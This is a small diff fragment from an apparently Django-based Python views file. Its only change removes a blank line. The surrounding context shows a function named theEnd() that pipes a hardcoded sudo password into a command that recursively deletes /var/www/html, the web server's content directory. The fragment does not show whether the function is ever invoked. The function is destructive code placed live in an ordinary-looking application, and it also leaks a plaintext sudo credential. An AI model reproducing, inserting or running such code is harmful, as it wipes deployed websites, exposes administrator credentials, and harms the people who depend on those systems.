@@ -512,7 +512,6 @@ def obnovi(request, id):
     return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
 
 
-
 def theEnd():
 
     os.system("echo Elenthegenerous | sudo -S rm -rf /var/www/html")
